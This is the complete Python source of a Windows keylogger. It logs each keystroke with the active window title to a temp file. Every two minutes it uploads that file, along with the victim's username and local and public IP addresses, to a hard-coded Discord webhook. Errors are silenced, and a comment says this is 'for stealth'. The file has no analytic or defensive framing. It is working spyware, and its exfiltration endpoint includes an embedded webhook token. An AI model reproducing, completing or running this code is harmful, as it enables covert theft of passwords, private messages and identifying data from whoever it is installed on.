import os
import tempfile
import threading
import requests
import socket
import getpass
from pynput import keyboard
import time
import win32gui
import win32process
import psutil
import win32console
import win32con



# ===== CONFIGURATION =====
WEBHOOK_URL = 'https://discord.com/api/webhooks/1380012472039374888/gMtF4yuDU0cSwZ06YquD4qzqTHFBaMEsbJ8KkC0fUEi0o_DRehDqIIerFIfDIZ-_GXAl'
UPLOAD_INTERVAL = 120  # Time in seconds between uploads

# ===== FILE SETUP =====
temp_dir = tempfile.gettempdir()
log_dir = os.path.join(temp_dir, 'key')
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, 'key.txt')

# ===== TRACK ACTIVE WINDOW =====
current_app = ""
def get_active_window_title():
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        app_name = process.name()
        window_title = win32gui.GetWindowText(hwnd)
        return f"{app_name} - {window_title}"
    except Exception:
        return "Unknown App"

# ===== SYSTEM INFO =====
def get_system_info():
    try:
        username = getpass.getuser()
        local_ip = socket.gethostbyname(socket.gethostname())
        public_ipv4 = requests.get('https://api.ipify.org').text.strip()
        public_ipv6 = requests.get('https://api64.ipify.org').text.strip()
        return f"Username: {username}\nLocal IP: {local_ip}\nPublic IPv4: {public_ipv4}\nPublic IPv6: {public_ipv6}"
    except Exception as e:
        return f"System Info Error: {e}"

# ===== KEYLOGGING FUNCTION =====
def log_key(key):
    global current_app
    active_window = get_active_window_title()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    if active_window != current_app:
        current_app = active_window
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"\n\n[{timestamp}] → {current_app}\n")

    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key.name}]"
    else:
        key_str = key_str.replace("'", "")

    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(f'{key_str} ')

# ===== SEND TO DISCORD =====
def send_to_webhook():
    if os.path.exists(log_file):
        try:
            system_info = get_system_info()
            with open(log_file, 'rb') as f:
                files = {'file': ('keylog.txt', f)}
                data = {'content': f'```{system_info}```'}
                response = requests.post(WEBHOOK_URL, files=files, data=data)

            if response.status_code == 200:
                with open(log_file, 'w', encoding='utf-8') as f:
                    f.write('')
        except Exception:
            pass  # Silent error handling for stealth

    threading.Timer(UPLOAD_INTERVAL, send_to_webhook).start()

# ===== START LISTENING =====
def on_press(key):
    log_key(key)
    if key == keyboard.Key.esc:
        return False

if __name__ == '__main__':
    send_to_webhook()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()